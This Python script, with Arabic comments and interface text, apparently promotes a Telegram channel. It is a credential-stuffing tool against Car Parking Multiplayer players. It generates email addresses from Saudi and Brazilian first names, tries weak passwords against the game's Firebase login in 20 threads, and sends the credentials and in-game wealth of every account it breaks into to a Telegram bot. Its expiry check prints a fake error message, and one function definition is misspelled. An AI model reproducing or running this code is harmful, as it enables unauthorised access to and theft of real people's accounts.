import subprocess
import sys
import os
import random
import threading
import datetime
import json
import time
import requests
from colorama import Fore, init, Style
from cfonts import render
import webbrowser

required_libs = ["requests", "colorama", "cfonts"]

df install_libs():
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            print(f"[+] تثبيت المكتبة: {lib}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_libs()

init(autoreset=True)
lock = threading.Lock()
session = requests.Session()
hits = 0
bad = 0
checked = 0


# رسمة التنين
dragon_art = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣾⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⣿⣷⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣿⡿⠋⠉⠀⣿⡇⠀⠀⠉⠻⣿⣷⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⣿⠟⣻⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⡛⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣷⣾⣿⡟⢻⣿⣿⣿⣿⣍⣹⣿⣿⣿⣿⠟⢿⣿⣷⣿⣿⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡿⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠳⠾⢿⣿⣿⣿⠟⢛⣿⣿⣿⣉⣹⣿⣿⣿⠛⢿⣿⣿⣿⡿⠷⠚⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠻⡿⣟⣻⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣻⠿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⡿⠿⠟⠛⠛⠛⠛⠛⠿⢿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣴⣿⣿⠿⣛⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⡛⢿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣼⣿⣿⢟⡥⠚⠁⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠈⠓⢌⡻⣿⣿⣷⡀⠀⠀⠀
⠀⠀⢠⣿⣿⠟⡡⠋⢀⣴⣶⣄⠀⢙⠦⠒⠒⠒⠒⠒⠒⠴⠋⠀⡰⠓⢆⡀⠙⢌⢿⣿⣿⡄⠀⠀
⠀⢠⣿⣿⠏⡜⠁⣠⣾⣿⣿⠿⠃⢀⠀⠐⢶⠒⠒⡶⠂⠀⡀⠘⢦⡀⠀⠑⡄⠈⢣⡹⣿⣿⡆⠀
⢀⣿⣿⡏⡜⠀⣰⣿⣿⡿⠋⢀⣴⣿⣷⣄⠀⠑⠊⠀⡠⠊⠙⢦⣀⣹⠆⠀⠘⡄⠀⢳⢹⣿⣿⡄
⣸⣿⣿⢰⠁⢠⠏⠻⣿⠁⢀⣾⣿⣿⣿⣿⣷⣄⣠⣾⣄⠀⠀⠀⠋⠀⠀⠀⠀⢹⡀⠈⡏⣿⣿⣇
⣿⣿⡟⠘⠀⢸⠀⠀⡇⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠈⡇⠀⡇⢻⣿⣿
⣿⣿⣧⢠⠀⢸⠀⠀⡇⠀⢿⠻⣿⣿⣿⣿⠀⢠⣀⣀⣸⣿⣿⣦⡀⠀⠀⠀⠀⠀⡇⠀⡆⢸⣿⣿
⢻⣿⣿⢸⡀⠸⡆⠀⢱⡀⠘⣆⠈⠻⣿⣿⠀⠸⠿⠿⢿⣿⣿⣿⣿⣦⡀⠀⠀⢸⠁⢀⡇⣿⣿⡿
⠘⣿⣿⡆⢧⠀⠻⡀⠀⢳⡀⠘⢦⣀⠈⢻⠀⢠⣤⣤⣼⣿⣿⠟⢿⣿⣿⣦⣠⠇⠀⣼⢰⣿⣿⠃
⠀⠹⣿⣿⡌⢦⠀⠱⣄⠀⠙⢦⡀⠈⠓⠚⠀⠸⠿⠿⠟⠋⠀⣀⣼⣿⣿⣿⠋⠀⡰⢃⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣎⠳⠖⠉⠀⠀⠀⠈⠓⠦⢤⠀⢀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣦⠜⣡⣿⣿⠟⠀⠀
⠀⠀⠀⠙⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⢸⣀⣸⠀⠀⠈⠻⣿⣿⣿⣿⣿⠿⣫⣾⣿⣿⠋⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⢋⣥⣾⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣷⣶⣤⣄⣀⣀⣀⣀⣀⣀⣠⣤⣴⣾⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠀ 
بحقـوق قنـاه DKL_F                          
فعـل VPN يخلي صيد اقوه 😉                  
صيـد لعبـه كار باركـنج                       
"""
from datetime import datetime
import sys

# تاريخ انتهاء الاداة
expiry_date = datetime(2026, 3, 12)

# الوقت الحالي
now = datetime.now()

# التحقق من التاريخ
if now >= expiry_date:
    print("""Traceback (most recent call last):
  File "/data/user/0/ru.iiec.pyahmed/files/accomp_files/iiec_run/iiec_run.py", line 31, in <module>
    start(fakepyfile,mainpyfile)
  File "/data/user/0/ru.iiec.pyahmed/files/accomp_files/iiec_run/iiec_run.py", line 30, in start
    exec(open(mainpyfile).read(),  __main__.__dict__)
  File "<string>", line 1
    What is the word "10"
                   ^
SyntaxError: invalid syntax

[Program finished]""")
    sys.exit()

print("")
# طباعة الرسمة
print(Fore.RED + dragon_art + Style.RESET_ALL)
webbrowser.open("https://t.me/DKL_F")

ID = input(Fore.RED + 'ايـدي: ')
token = input(Fore.YELLOW + 'توكيـن: ')
os.system('cls' if os.name == 'nt' else 'clear')


def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = render('CAR PARKING', colors=['red', 'white'], align='center')
    print(banner)
    print(Fore.CYAN + "="*60)
    print(Fore.GREEN + " اشتراك بقناتي تفيدك🙂💙")
    print(Fore.YELLOW + "قناتي:https://t.me/DKL_F")
    print(Fore.MAGENTA + "https://t.me/DKL_F")
    print(Fore.CYAN + "="*60 + '\n')

show_banner()

saudi_names = [
    "Mohammed", "Abdullah", "Faisal", "Yousef", "Abdulaziz", "Salman", "Nasser", "Khalid",
    "Abdurrahman", "Majid", "Turki", "Saud", "Abdulmalik", "Saeed", "Tariq", "Fahad",
    "Rashed", "Abdulilah", "Sultan", "Bandar", "Abdullatif", "Hesham", "Sami", "Saad",
    "Ziad", "Omar", "Ali", "Ibrahim", "Adel", "Hashim", "Rami", "Majed", "Bassam",
    "Fahd", "Samer", "Kareem", "Jamal", "Nabil", "Yahya", "Ahmad", "Saleh", "Riyad",
    "Aliya", "Noura", "Huda", "Sara", "Reem", "Joud", "Lama", "Dania", "Rana",
    "Tala", "Fatima", "Mariam", "Jameela", "Amina", "Zainab", "Khadijah", "Hind",
    "Souad", "Nada", "Ruqayyah", "Bushra", "Nawal", "Hanan", "Layla", "Eman", "Asma",
    "Dalal", "Mona", "Sawsan", "Rana", "Amal", "Salma", "Maha", "Lubna", "Najat",
    "Shatha", "Areej", "Hala", "Nisreen", "Samira", "Suha", "Nour", "Riham", "Wafa",
    "Yasmin", "Nadia", "Faten", "Heba", "Sana", "Kholoud", "Noor", "Dina", "Ruba",
    "Rawan", "Rana", "Maysaa", "Jawaher"
]
brazil_names = [
    "joao", "maria", "carlos", "ana", "pedro", "lucas", "marcos", "rafael",
    "bruno", "jose", "gabriel", "luan", "felipe", "paulo", "mateus", "mariana",
    "fernanda", "thiago", "ricardo", "camila", "daniel", "gabriela", "luiza",
    "renan", "isabela", "eduardo", "gustavo", "aline", "roberto", "fabio",
    "juliana", "patricia", "leticia", "laura", "vinicius", "andressa", "rodrigo",
    "amanda", "bruna", "rafaela", "diego", "samuel", "bianca", "alexandre",
    "brenda", "adriana", "alessandro", "alessandra", "alvaro", "amalia", "ana", "andre",
    "angelica", "antonio", "arthur", "barbara", "bernardo", "bia", "caio", "cecilia",
    "claudio", "daniela", "eduarda", "elias", "eloisa", "enrico", "erika", "fabiana",
    "fabio", "fernando", "francisco", "gabriela", "giovanna", "gustavo", "heitor",
    "helena", "hugo", "isadora", "jessica", "joana", "joseph", "juarez", "julio",
    "larissa", "leonardo", "livia", "luan", "luciana", "marcio", "marina", "marta",
    "mateus", "michel", "monica", "natalia", "nicolas", "paola", "pedro", "rafael",
    "renata", "rodrigo", "samira", "sandro", "sara", "simon", "talia", "thiago"
]

domains_saudi = ['gmail.com', 'hotmail.com', 'yahoo.com']
domains_brazil = ['gmail.com', 'bol.com.br', 'uol.com.br']
fixed_passwords = [
    "123456",
    "1234567",
    "12345678",
    "123456789",
    "111111",
    "11111111",
    "222222",
    "1234567890",
    "aaaaaa",
    "1122334455",
    "1234554321"
]
def decode_nested_json(d):
    for k, v in d.items():
        if isinstance(v, str):
            try:
                d[k] = decode_nested_json(json.loads(v))
            except:
                pass
        elif isinstance(v, dict):
            d[k] = decode_nested_json(v)
    return d

def send_telegram(msg):
    try:
        url = f'https://api.telegram.org/bot{token}/sendMessage'
        session.post(url, data={
            'chat_id': ID,
            'text': msg,
            'parse_mode': 'markdown'
        }, timeout=10)
    except:
        pass

def print_status_loop():
    while True:
        with lock:
            now = datetime.datetime.now().strftime("%H:%M:%S")
            status = (
                f"{Fore.LIGHTCYAN_EX}[{now}] "
                f"{Fore.GREEN}صـح: {hits}   "
                f"{Fore.RED}مستخدم: {bad}   "
                f"{Fore.YELLOW}متـاح: {checked}"
            )
            sys.stdout.write('\r' + status + ' '*10)
            sys.stdout.flush()
        time.sleep(1)

def login(email, password):
    global hits, bad, checked
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    headers = {
        "Content-Type": "application/json",
        "X-Android-Package": "com.olzhas.carparking.multyplayer",
        "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
        "Accept-Language": "tr-TR,en-US",
        "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
        "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
        "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    }
    try:
        res = session.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
            json=data, headers=headers, timeout=5
        )
        with lock: checked += 1
        if res.status_code != 200 or "idToken" not in res.text:
            with lock: bad += 1
            return

        token_id = res.json()["idToken"]
        acc_info = session.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
            json={"idToken": token_id}, headers=headers, timeout=5
        ).json()
        createdAt = acc_info["users"][0]["createdAt"]

        headers2 = {
            "authorization": f"Bearer {token_id}",
            "firebase-instance-id-token": "fake",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.12.13"
        }
        res_info = session.post(
            "https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2",
            json={"data": "2893216D41959108CB8FA08951CB319B7AD80D02"},
            headers=headers2, timeout=5
        ).text

        acc_data = json.loads(res_info)
        result = decode_nested_json(json.loads(acc_data["result"]))

        msg = f'''*بعد شتريد من اللهCar Parking*
📧 الإيميل: {email}
🔑 كلمة المرور: {password}
👤 الاسم: {result.get("Name", "N/A")}
🪙 الكوين: {result.get("coin", "0")}
💰 المال: {result.get("money", "0")}
👥 الأصدقاء: {len(result.get("FriendsID", []))}
📅 تم الإنشاء: {datetime.datetime.fromtimestamp(int(createdAt)/1000).strftime("%Y/%m/%d")}
https://t.me/DKL_F
تفيدك🙂‍↔️💙'''
        send_telegram(msg)

        with lock: hits += 1
    except:
        with lock: bad += 1

def worker_saudi():
    while True:
        name = random.choice(saudi_names)
        number = ''.join(random.choices('0123456789', k=random.randint(0, 3)))
        domain = random.choice(domains_saudi)
        email = f"{name}{number}@{domain}"
        for pwd in fixed_passwords:
            login(email, pwd)

def worker_brazil():
    while True:
        name = random.choice(brazil_names)
        number = ''.join(random.choices('0123456789', k=random.randint(0, 3)))
        domain = random.choice(domains_brazil)
        email = f"{name}{number}@{domain}"
        for pwd in fixed_passwords:
            login(email, pwd)

threading.Thread(target=print_status_loop, daemon=True).start()


for _ in range(10):  
    threading.Thread(target=worker_saudi, daemon=True).start()
for _ in range(10):  
    threading.Thread(target=worker_brazil, daemon=True).start()


while True:
    time.sleep(1)
